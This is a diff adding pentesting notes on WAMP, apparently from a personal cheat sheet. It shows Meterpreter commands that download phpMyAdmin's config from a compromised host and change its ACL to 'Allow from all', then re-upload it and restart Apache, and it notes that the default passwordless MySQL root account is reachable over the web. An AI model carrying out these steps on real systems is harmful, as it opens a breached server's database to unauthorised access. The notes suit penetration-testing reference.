@@ -1,3 +1,34 @@
 # WAMP
 
 - See also [MySQL](./MySQL.md).
+
+- Modify phpmyadmin.conf to allow remote access.
+```
+meterpreter > cd C:\\wamp\\alias\\
+meterpreter > dir
+meterpreter > download C:\\wamp\\alias\\phpmyadmin.conf
+
+Edit ACL:
+
+<Directory "c:/wamp/apps/phpmyadmin3.4.10.1/">
+    Options Indexes FollowSymLinks MultiViews
+    AllowOverride all
+        Order Deny,Allow --> Delete
+        Deny from all --> Delete
+        Allow from 127.0.0.1 --> Allow from all
+</Directory>
+
+meterpreter > upload ~/phpmyadmin.conf
+meterpreter > cat phpmyadmin.conf
+meterpreter > shell
+
+net stop wampapache
+net start wampapache
+```
+
+- There is no such thing as a phpMyAdmin user. phpMyAdmin is a front-end for MySQL, so we're talking about MySQL users.
+```
+http://<ip>:8585/phpmyadmin
+
+Your configuration file contains settings (root with no password) that correspond to the default MySQL privileged account. Your MySQL server is running with this default, is open to intrusion, and you really should fix this security hole by setting a password for user 'root'.
+```
